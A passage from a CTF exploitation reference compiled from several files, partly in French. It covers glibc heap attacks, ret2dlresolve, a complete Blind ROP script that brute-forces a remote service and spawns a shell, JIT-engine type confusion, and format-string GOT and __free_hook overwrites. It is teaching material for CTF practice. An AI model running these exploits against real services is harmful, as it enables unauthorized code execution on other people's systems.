# Step 3: Unsorted bin attack or FSOP from here
# Overwrite _IO_list_all via unsorted bin's bk pointer
```

**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.

**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).

---

## House of Spirit

**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.

```python
# Forge fake fastbin chunk on the stack
# Need valid size field and next chunk's size for validation
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
    0,              # next chunk prev_size
    0x41,           # next chunk size (passes free() validation)
)

# Write fake chunk address somewhere the binary will free()
# e.g., overwrite a pointer that gets passed to free()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# Trigger free(target_ptr) → fake chunk enters fastbin
trigger_free()

# Next malloc(0x38) returns our fake chunk → write to controlled area
malloc_and_write(0x38, payload)
```

**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.

---

## House of Lore

**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.

```python
# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Forge fake chunk in target area
# fake->fd must point back to the real smallbin chunk
# fake->bk must point to another valid-looking chunk (or same)
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → points back to legitimate chunk
    addr_of_fake2,              # bk → another fake or self
)

# Step 3: Overwrite chunk_a->bk to point to our fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Step 4: Two allocations from this smallbin
alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
```

**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.

---

## ret2dlresolve

**Pattern:** Forge `Elf64_Sym` and `Elf64_Rela` structures to trick the dynamic linker into resolving an arbitrary function (e.g., `system`) at the next PLT call. Bypasses ASLR without any libc leak.

```python
from pwn import *

# pwntools has built-in ret2dlresolve support
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Stage 1: Send ROP chain
io.sendline(flat({offset: rop.chain()}))

# Stage 2: Send forged dl-resolve payload
io.sendline(dlresolve.payload)
```

**Manual approach (understanding the internals):**
```python
# Forge at a writable address (e.g., .bss)
# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
# 2. Fake Elf64_Sym: st_name offset points to our "system" string
# 3. "system\x00" string

SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate reloc_index so PLT stub pushes correct index
reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)

# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
fake_sym_st_name = fake_string_addr - STRTAB
```

**Key insight:** ret2dlresolve works without ANY leak. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.

**Requirements:** Partial RELRO (Full RELRO resolves all symbols at load time, defeating this). Writable memory to place forged structures.

---

## tcache Stashing Unlink Attack

**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.

```python
# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
# The 2nd smallbin chunk has corrupted bk → target address

# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
for i in range(7):
    free(tcache_chunks[i])
# These two go to unsorted → smallbin after sorting
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large)  # Sort unsorted bin → chunks enter smallbin

# Step 2: Drain tcache
for i in range(7):
    malloc(target_size)

# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)

# Step 4: Allocate from smallbin
# malloc returns smallbin_chunk_1
# Stashing mechanism follows bk chain:
#   smallbin_chunk_2 gets stashed into tcache
#   Then follows corrupted bk → target gets stashed into tcache too!
malloc(target_size)

# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
malloc(target_size)  # Returns chunk_2
malloc(target_size)  # Returns target_addr → arbitrary write!
```

**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.

**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.

---

## Kernel Exploitation

For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Quick reference:

- `modprobe_path` overwrite for root code execution (requires AAW)
- `tty_struct` kROP via fake vtable and stack pivot
- `userfaultfd` for deterministic race conditions
- Heap spray with `tty_struct`, `poll_list`, `user_key_payload`, `seq_operations`
- KASLR/FGKASLR/SMEP/SMAP/KPTI bypass techniques
- Kernel config recon checklist

**Basic patterns (userland-adjacent):**
- OOB via vulnerable `lseek` handlers
- Heap grooming with forked processes
- SUID binary exploitation via kernel-to-userland buffer overflow
- Check kernel config for disabled protections:
  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations



---

<!-- Source: brop.md -->

# CTF Pwn — Blind ROP (BROP)

Technique d'exploitation d'un service sans accès au binaire. On sonde le comportement via les crashes pour construire un exploit complet.

## Concept

BROP (Blind Return-Oriented Programming) exploite des serveurs qui :
1. **Fork** à chaque connexion (même ASLR, même canary entre forks)
2. **Crashent** sur un mauvais payload (connexion fermée)
3. **Continuent** si le payload est correct (connexion maintenue)

La randomisation ASLR ne change pas entre les forks → on peut bruteforcer adresse par adresse.

## Étapes BROP

```
1. Trouver l'offset du buffer overflow
2. Leaker le canary (si présent) byte par byte
3. Leaker l'adresse de retour sauvegardée → calculer PIE base
4. Trouver des gadgets : stop gadget, pop gadget (BROP gadget)
5. Trouver puts() ou write() dans la PLT
6. Dump le binaire via puts(addr, len)
7. Construire l'exploit complet depuis le binaire dumpé
```

---

## Phase 1 : Trouver l'offset du buffer overflow

```python
from pwn import *

HOST, PORT = 'target', 1337

def try_payload(payload):
    """Retourne True si la connexion reste ouverte (pas de crash)"""
    try:
        io = remote(HOST, PORT)
        io.sendline(payload)
        # Essayer de recevoir une réponse
        io.recv(timeout=1)
        io.close()
        return True  # Vivant
    except:
        return False  # Crash

# Trouver la taille du buffer
for size in range(1, 500):
    payload = b'A' * size
    if not try_payload(payload):
        # Crash à cette taille : buffer = size - 1
        print(f"[+] Buffer size: {size - 1}")
        buffer_size = size - 1
        break
```

## Phase 2 : Leak du canary (si présent)

```python
# Canary : 8 bytes, byte le plus bas toujours \x00 en x64
# On bruteforce byte par byte après le buffer

canary = b'\x00'  # Premier byte connu

for byte_idx in range(1, 8):  # 7 bytes restants
    for byte_val in range(256):
        # Envoyer : buffer + canary_partiel + byte_test + padding jusqu'à ret
        test_payload = b'A' * buffer_size + canary + bytes([byte_val])
        
        # Si pas de crash → byte correct
        if try_payload(test_payload):
            canary += bytes([byte_val])
            print(f"[+] Canary byte {byte_idx}: {hex(byte_val)}")
            break

print(f"[+] Canary: {hex(u64(canary))}")
```

## Phase 3 : Leak de l'adresse de retour (PIE bypass)

```python
# Après le canary, saved RBP (8 bytes), puis saved RIP (adresse retour)
# Lire saved RIP byte par byte pour leaker l'adresse de code

saved_rip = b''
for byte_idx in range(6):  # 6 bytes significatifs (adresse 48-bit)
    for byte_val in range(256):
        # Tenter un overwrite partiel : garder les bytes précédents + tester le nouveau
        test = b'A' * buffer_size + canary + p64(0)  # fake RBP
        test += saved_rip + bytes([byte_val])
        
        # stop_gadget : une adresse qui fait continuer le programme (pas crash)
        # Pour phase 3, on cherche juste à ne pas crasher → utiliser \x00 bytes
        # L'adresse de retour doit être valide → essayer de trouver une bonne addr
        
        # Heuristique : une adresse qui retourne dans main est valide
        # On la trouve si try_payload retourne True avec une adresse mappée
        if try_payload(test + bytes([0x00] * (6 - byte_idx - 1))):
            saved_rip += bytes([byte_val])
            break

pie_base = u64(saved_rip.ljust(8, b'\x00')) - known_offset  # offset de main par ex
print(f"[+] PIE base: {hex(pie_base)}")
```

## Phase 4 : Trouver le BROP Gadget et Stop Gadget

### Stop Gadget

Un "stop gadget" est une adresse qui, quand utilisée comme adresse de retour, ne fait **pas** crasher le programme (ex: `_start`, `main`, boucle infinie).

```python
def find_stop_gadget(pie_base, canary, rbp_offset):
    """Cherche une adresse qui ne crashe pas quand utilisée comme RIP"""
    found_stops = []
    
    # Scanner le texte du binaire pour des stop gadgets
    for offset in range(0, 0x10000, 1):
        addr = pie_base + offset
        payload = b'A' * buffer_size + canary + p64(0) + p64(addr)
        
        if try_payload(payload):
            print(f"[+] Stop gadget candidat: {hex(addr)}")
            found_stops.append(addr)
            
            if len(found_stops) >= 5:
                break
    
    return found_stops[0] if found_stops else None
```

### BROP Gadget

Le gadget `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` (fin de `__libc_csu_init`) pop 6 registres → si utilisé comme RIP, pop 6 valeurs de la pile avant de retourner vers le stop gadget.

```python
def find_brop_gadget(pie_base, canary, stop_gadget):
    """
    BROP gadget : pop 6 registres (ret survit si stop gadget après)
    vs gadget pop 1 : survivrait aussi mais n'est pas aussi utile
    Différencier via le nombre d'arguments sur la pile
    """
    
    for offset in range(0, 0x10000, 1):
        addr = pie_base + offset
        
        # Test : addr + 6 * 0 + stop_gadget
        # Un gadget qui pop N registres : besoin de N valeurs junk après addr
        # Si N=6 : survivre avec 6 junk values → c'est le BROP gadget
        
        payload_6 = b'A' * buffer_size + canary + p64(0)
        payload_6 += p64(addr)           # gadget testé
        payload_6 += p64(0) * 6         # 6 valeurs junk
        payload_6 += p64(stop_gadget)    # doit atteindre stop_gadget
        
        # Test avec 5 valeurs junk (doit crasher si le gadget pop 6)
        payload_5 = b'A' * buffer_size + canary + p64(0)
        payload_5 += p64(addr)
        payload_5 += p64(0) * 5
        payload_5 += p64(stop_gadget)
        
        survives_6 = try_payload(payload_6)
        survives_5 = try_payload(payload_5)
        
        # Un gadget pop 6 : survit avec 6 junk, crashe avec 5
        if survives_6 and not survives_5:
            print(f"[+] BROP gadget: {hex(addr)}")
            return addr
    
    return None
```

## Phase 5 : Trouver write() ou puts() dans la PLT

```python
def find_plt_function(pie_base, canary, brop_gadget, stop_gadget, write_fd=1):
    """
    Scanner la PLT pour trouver write() ou puts()
    write(fd=1, buf, len) : si buf pointe vers la pile → sortie visible
    """
    
    # pop rdi; ret (offset +9 depuis BROP gadget dans __libc_csu_init)
    pop_rdi = brop_gadget + 9
    # pop rsi; pop r15; ret (offset +7 depuis BROP gadget)
    pop_rsi_r15 = brop_gadget + 7
    
    # PLT est généralement à un offset fixe depuis pie_base
    plt_base = pie_base + 0x400  # approximatif, scanner
    
    for plt_offset in range(0, 0x1000, 0x10):  # Entrées PLT = 16 bytes
        plt_entry = plt_base + plt_offset
        
        # Tenter d'appeler puts(ptr_to_known_string)
        # Si ça retourne data → c'est puts/write
        payload = b'A' * buffer_size + canary + p64(0)
        payload += p64(pop_rdi)
        payload += p64(pie_base)     # arg1 = adresse avec data connue ("\x7fELF")
        payload += p64(plt_entry)    # call PLT entry
        payload += p64(stop_gadget)  # retour après
        
        io = remote(HOST, PORT)
        io.sendline(payload)
        
        try:
            data = io.recv(timeout=2)
            if b'\x7fELF' in data or len(data) > 4:
                print(f"[+] puts() ou write() trouvé en PLT: {hex(plt_entry)}")
                io.close()
                return plt_entry
        except:
            pass
        io.close()
    
    return None
```

## Phase 6 : Dumper le binaire

```python
def dump_binary(pie_base, canary, pop_rdi, puts_plt, stop_gadget):
    """
    Lire le binaire complet via puts() pour analyse statique
    """
    binary = b''
    
    for addr in range(pie_base, pie_base + 0x10000, 0x40):
        payload = b'A' * buffer_size + canary + p64(0)
        payload += p64(pop_rdi)
        payload += p64(addr)        # adresse à lire
        payload += p64(puts_plt)    # puts(addr)
        payload += p64(stop_gadget)  # continuer après
        
        io = remote(HOST, PORT)
        io.sendline(payload)
        
        # puts() s'arrête au premier \x00 → remettre manuellement
        chunk = io.recvline(keepends=False)
        chunk += b'\x00'  # puts a coupé ici
        
        # Paddé à 0x40 bytes (taille demandée)
        chunk = chunk.ljust(0x40, b'\x00')
        binary += chunk[:0x40]
        
        io.close()
    
    # Sauvegarder le binaire pour analyse avec Ghidra/radare2
    with open('dumped.bin', 'wb') as f:
        f.write(binary)
    
    print(f"[+] Binaire dumpé: {len(binary)} bytes → dumped.bin")
    return binary
```

## Phase 7 : Construire l'exploit final

```python
# Après avoir dumpé le binaire :
# 1. Analyser dans Ghidra/radare2 → trouver les vrais offsets
# 2. Identifier puts@GOT ou autres GOT entries pour leak libc
# 3. Construire ret2libc classique

from pwn import *

# Charger le binaire dumpé
elf = ELF('./dumped.bin')
elf.address = pie_base

# Ret2libc complet
libc = ELF('./libc.so.6')
pop_rdi = elf.address + 0x...  # depuis analyse Ghidra

payload = b'A' * buffer_size + canary + p64(0)
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

io = remote(HOST, PORT)
io.sendline(payload)
puts_leak = u64(io.recvn(8))
libc.address = puts_leak - libc.symbols['puts']

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))

payload2 = b'A' * buffer_size + canary + p64(0)
payload2 += p64(pop_rdi) + p64(binsh) + p64(system)

io.sendline(payload2)
io.interactive()
```

## Optimisations BROP

```python
# 1. Paralléliser les connexions pour accélérer le bruteforce
from concurrent.futures import ThreadPoolExecutor

def try_byte(args):
    offset, byte_val, current = args
    payload = b'A' * buffer_size + current + bytes([byte_val])
    return byte_val if try_payload(payload) else None

with ThreadPoolExecutor(max_workers=16) as ex:
    results = list(ex.map(try_byte, [(offset, b, current) for b in range(256)]))
    found = next(r for r in results if r is not None)

# 2. Binary search sur les adresses (au lieu de scan linéaire)
# Pour les stop gadgets : scanner par blocs de 0x100 d'abord

# 3. Caching des résultats intermédiaires
import pickle
try:
    state = pickle.load(open('brop_state.pkl', 'rb'))
except:
    state = {}

# Sauvegarder après chaque découverte importante
state['canary'] = canary
pickle.dump(state, open('brop_state.pkl', 'wb'))
```

## BROP vs serveurs sans fork (ASLR change à chaque connexion)

```python
# Sans fork : ASLR différent à chaque connexion → pas de bruteforce possible
# Alternatives :
# 1. Trouver un info-leak dans le protocole (HTTP headers, error messages)
# 2. Chercher une adresse partiellement overwritable (partial overwrite 12 bits fixes)
# 3. Non-PIE binary → adresses fixes malgré ASLR
# 4. Heap base leak via timing ou output

# Partial overwrite (12 bits fixes car alignement page)
# Overwrite 2 bytes du saved RIP (1 bit d'entropie pour le nibble)
for nibble in range(16):
    payload = b'A' * buffer_size + p16((known_low_12 & 0xff0) | nibble)
    if try_payload(payload):
        print(f"Nibble trouvé: {nibble}")
```



---

<!-- Source: browser-jit.md -->

# Browser / JIT Exploitation (V8, SpiderMonkey, JSC)

Mechanics-first index for JIT-engine challenges. Run `d8`/`js` shells, Turbofan IR inspection, and patch diffs against upstream are the unifying primitives.

## Triggering on the challenge

**Signals the target is JIT pwn (not random JS):**
- Binary is `d8` (V8), `js` (SpiderMonkey JSShell), or `jsc` (JSC).
- Challenge ships a **patch file** (`*.patch`, `*.diff`) modifying `turbofan`, `ionmonkey`, `b3`, or `dfg` sources — the diff IS the bug.
- Patched `v8/src/compiler/*-reducer.cc`, `typer.cc`, `representation-change.cc`, `simplified-lowering.cc`.
- README cites a CVE (`CVE-2024-4761`, `CVE-2024-5274`, `CVE-2025-6554`, etc.) — replay of a public bug.

## V8 Turbofan Type-Confusion

**Trigger:** patch adds a new typer rule (`Typer::Visitor::TypeFoo`) that returns too narrow a `Type::Range` or `Type::OtherNumber`; subsequent `CheckBounds` elision on array accesses lets the attacker OOB-read/-write the BackingStore.

**Workflow:**
1. `d8 --allow-natives-syntax` + a helper lib (`utils.js` from any CTF repo) providing `ftoi`, `itof`, `hex`, `addrof`, `fakeobj`.
2. Write a small function that the patched typer over-optimises:
   ```js
   function leak(idx) {
     let a = [1.1, 2.2, 3.3];  // PACKED_DOUBLE_ELEMENTS
     return a[idx];            // CheckBounds eliminated → OOB read
   }
   for (let i = 0; i < 0x10000; i++) leak(0);  // warm Turbofan
   %OptimizeFunctionOnNextCall(leak); leak(0);
   leak(<large>); // OOB
   ```
3. Build `addrof` / `fakeobj` primitives via corrupted map pointers (pre-V8 pointer-compression) or corrupted `length` (post-PC).
4. Overwrite a WASM instance's code-page pointer → shellcode (V8 allocates WASM code RWX on many configs; if not, use `Sandbox::CallbackTable` bypass).

**Key grep patterns on the patch:**
```
grep -nE 'Type::(Range|OtherNumber|MinusZero|Unsigned31)' patch.diff
grep -nE 'CheckBounds|kRemoveUnreachable|kRelaxedEquals' patch.diff
grep -nE 'kTypedArray|kJSArray|kBackingStore' patch.diff
```

## V8 Pointer-Compression Era (≥ 8.0)

**Mechanic change:** heap pointers are 32-bit offsets into an 8 GB "cage"; classic `addrof` using object-to-double confusion reads the compressed tagged word. `fakeobj` needs a **cage-relative** target — use uninitialised TypedArrays or crafted `PropertyCell`s. Upgrading an arbitrary 32-bit R/W inside the cage to native code exec requires an **escape gadget** (WASM code page, `JIT_Unprotect`, or sandbox bypass via `ExternalPointerTable`).

## V8 Sandbox Bypass (`v8_enable_sandbox = true`)

**Signals:** build flags include `v8_enable_sandbox`; challenge ship a `d8` with `--sandbox-testing`; attacker only has a cage-internal primitive.
**Mechanic:** corrupt an `ExternalPointer` tagged as `kEmbedderPointerTag` but redirected to a real target. Known bypasses:
- `TypedArray.buffer` rewritten to an external `ArrayBuffer` whose backing store is a V8 function pointer.
- `JSDataView` byteOffset overflow — skips bounds, reads cage-external.
- `WebAssembly.Instance.exports.fn.table` exploited via `WasmDispatchTable` corruption.

Reference: Samuel Groß's "V8 Heap Sandbox" whitepapers + Maddie Stone's 2025 Project-Zero writeups.

## SpiderMonkey IonMonkey Range Analysis Bugs

**Trigger:** patch touches `js/src/jit/RangeAnalysis.cpp` or `ValueNumbering.cpp`; added/removed `MDefinition::computeRange`.
**Signals:** patched `MUrsh`, `MMod`, `MAdd` ranges; `MToInt32` bound changes.
**Mechanic:** craft an arithmetic loop where the patched range claims a tighter bound than truth; Ion elides a bounds check on a typed array indexed by the mis-ranged value. Primitives follow: `addrof` via `ObjectElements`, `fakeobj` via fake `Shape`. Dev build: `./configure --enable-debug --disable-optimize --disable-jemalloc` then `gdb --args ./js jsshell-test.js`.

## JSC DFG / FTL OSR-Exit Bugs

**Trigger:** WebKit patch modifies `Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp` or `ftl/FTLLowerDFGToB3.cpp`.
**Signals:** challenge uses `jsc` CLI; patch adds / removes `speculationCheck` or `jsValueToDouble` coercions.
**Mechanic:** arrange OSR-exit with a register that the exit-snapshot claims is `Int32` but runtime holds a `double` / `JSCell`. On exit, baseline sees a misinterpreted value and the interpreter hands it to a subsequent `GetByVal` → type confusion → primitives.

## Exploit-Dev Tooling

- **V8 diff reader:** `tools/turbolizer` (in-tree) shows the IR graph for each phase; compare pre/post-patch.
- **Heap poking:** `--no-enable-short-builtin-calls`, `--trace-opt`, `--print-opt-code`, `--allow-natives-syntax`.
- **Corruption readers:** `%DebugPrint(obj)` / `%SystemBreak()` / `readline()`.
- **SpiderMonkey:** `os.getenv`, `serialize()`/`deserialize()`, `js -f test.js` with `--fuzzing-safe`.
- **JSC:** `describe(o)`, `describeArray(a)`, `edenGC()`, `fullGC()` — trigger GC between steps.

## Pattern Recognition Index additions (add to ctf-pwn/SKILL.md)

| Signal | Technique → file |
|---|---|
| `d8` / `js` / `jsc` binary + `*.patch` file modifying JIT compiler sources | JIT type-confusion → browser-jit.md |
| V8 build with `v8_enable_sandbox=true`; primitive only inside cage | ExternalPointerTable bypass → browser-jit.md#v8-sandbox-bypass |
| Turbofan typer patch touching `Type::Range` / `Type::OtherNumber` | Range-analysis type confusion → browser-jit.md |
| IonMonkey `RangeAnalysis.cpp` diff | SpiderMonkey range bug → browser-jit.md |
| JSC `DFGSpeculativeJIT.cpp` / `FTLLowerDFGToB3.cpp` diff | OSR-exit misassumption → browser-jit.md |

References: [v8.dev/blog](https://v8.dev/blog), [googleprojectzero.blogspot.com](https://googleprojectzero.blogspot.com), [trailofbits.com/blog](https://blog.trailofbits.com).



---

<!-- Source: format-string.md -->

# CTF Pwn - Format String Exploitation

## Table of Contents
- [Format String Basics](#format-string-basics)
- [Argument Retargeting (Non-Positional %n Trick)](#argument-retargeting-non-positional-n-trick)
- [Blind Pwn (No Binary Provided)](#blind-pwn-no-binary-provided)
- [Format String with Filter Bypass](#format-string-with-filter-bypass)
- [Format String Canary + PIE Leak](#format-string-canary--pie-leak)
- [__free_hook Overwrite via Format String (glibc < 2.34)](#__free_hook-overwrite-via-format-string-glibc--234)
- [.rela.plt / .dynsym Patching](#relaplt--dynsym-patching)
- [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
- [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
- [argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)

---

## Format String Basics

- Leak stack: `%p.%p.%p.%p.%p.%p`
- Leak specific offset: `%7$p`
- Write value: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte)
- GOT overwrite for code execution

**Write size specifiers (x86-64):**
| Specifier | Bytes Written | Use Case |
|-----------|---------------|----------|
| `%n` | 4 | 32-bit values |
| `%hn` | 2 | Split writes |
| `%hhn` | 1 | Precise byte writes |
| `%lln` | 8 | Full 64-bit address (clears upper bytes) |

**IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.

**Arbitrary read primitive:**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**Arbitrary write primitive:**
```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**Manual GOT overwrite (x86-64):**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**Offset calculation for addresses:**
- Buffer typically starts at offset 6 (after register args)
- If format string is padded to N bytes, addresses start at offset: `6 + N/8`
- Example: 16-byte format → addresses at offset 8
- Example: 32-byte format → addresses at offset 10
- Example: 64-byte format → addresses at offset 14

**Verify offset with test payload:**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT target selection:**
- If `exit@GOT` doesn't work, try other GOT entries
- `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
- Target functions called AFTER the format string vulnerability
- Check call order in disassembly to pick best target

## Argument Retargeting (Non-Positional %n Trick)

Use this when you cannot embed addresses (input filtering, newline issues) but can still use `%n` and a stack pointer is available as an argument.

**Key idea:** Non-positional specifiers consume arguments in order. You can overwrite a *future* argument (which is itself a pointer) before it is used, then use it as an arbitrary write target.

**Why non-positional:** Positional formats (`%22$hn`) are cached up front by glibc, so changing the underlying stack slot after parsing won’t change the pointer. Non-positional `%n` avoids that cache.

**Workflow (example):**
1. Leak offsets: find a stack pointer argument you can overwrite (e.g., saved `rbp` on the stack).
2. Advance the argument index with `%c` (each `%c` consumes one argument).
3. Use `%n` to write a 4-byte value into that pointer slot (e.g., make arg22 point to `exit@GOT`).
4. Print additional chars and use `%hn` to write the low 2 bytes to the now-retargeted pointer.

**Pattern (conceptual):**
```text
%c%c%c...%c      # consume args to reach pointer slot
%<big>c%n        # overwrite pointer slot to target_addr (e.g., exit@GOT)
%<delta>c%hn     # write low 2 bytes of win to that GOT entry
```

**Compute widths:**
- After writing `target_addr` with `%n`, the printed count is `C`.
- To write low 2 bytes `W` with `%hn`, print:
  - `delta = (W - (C % 65536)) mod 65536`

**When it works well:**
- No PIE / Partial RELRO (GOT writable)
- You can afford large outputs (millions of chars)

**Stack layout discovery (find your input offset):**
```text
%1$p %2$p %3$p ... %50$p
```
- Your input appears at some offset (commonly 6-8)
- Canary: looks like `0x...00` (null byte at end)
- Saved RBP: stack address pattern
- Return address: code address (PIE or libc)

## Blind Pwn (No Binary Provided)

When no binary is given, use format strings to discover everything:

**1. Confirm vulnerability:**
```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. Discover protections by leaking stack:**
- Find canary (offset ~39, pattern `0x...00`)
- Find saved RBP (offset ~40, stack address)
- Find return address (offset ~41-43, code pointer)

**3. Identify PIE base:**
- Leak return address pointing into main/binary
- Subtract known offset to get base (may need guessing)

**4. Dump GOT to identify libc:**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. Cross-reference libc database:**
- https://libc.blukat.me/
- https://libc.rip/
- Input multiple function addresses to identify exact libc version

**6. Calculate libc base:**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**Common stack offsets (x86_64):**
| Offset | Typical Content |
|--------|-----------------|
| 6-8 | User input buffer |
| ~39 | Stack canary |
| ~40 | Saved RBP |
| ~41-43 | Return address |

## Format String with Filter Bypass

**Pattern (Cvexec):** `filter_string()` strips `%` but skippable with `%%%p`.

**Filter bypass:** If filter checks adjacent chars after `%`:
- `%p` → filtered
- `%%p` → properly escaped (prints literal `%p`)
- `%%%p` → third `%` survives, prints stack value

**GOT overwrite via format string (byte-by-byte with `%hhn`):**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

## Format String Canary + PIE Leak

**Pattern (My Little Pwny):** Format string vulnerability to leak canary and PIE base, then buffer overflow.

**Two-stage attack:**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```

## __free_hook Overwrite via Format String (glibc < 2.34)

**Pattern (Notetaker, PascalCTF 2026):** Full RELRO + No PIE + format string vulnerability. Can't overwrite GOT, but `__free_hook` is writable.

**Key insight:** `free(ptr)` passes `ptr` in `rdi` as first argument. If `__free_hook = system`, then `free("cat flag")` executes `system("cat flag")`.

```python
# 1. Leak libc via format string
p.sendline(b'%43$p')  # __libc_start_main return address
libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET

# 2. Write system() address to __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')

# 3. Trigger: send command as menu input, program calls free(input_buffer)
p.sendline(b'cat flag')  # free() → system("cat flag")
```

**When to use:** Full RELRO (no GOT overwrite) + glibc < 2.34 (hooks still exist). For glibc >= 2.34, hooks are removed - target return addresses or `_IO_FILE` structs instead.

## .rela.plt / .dynsym Patching

**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory.

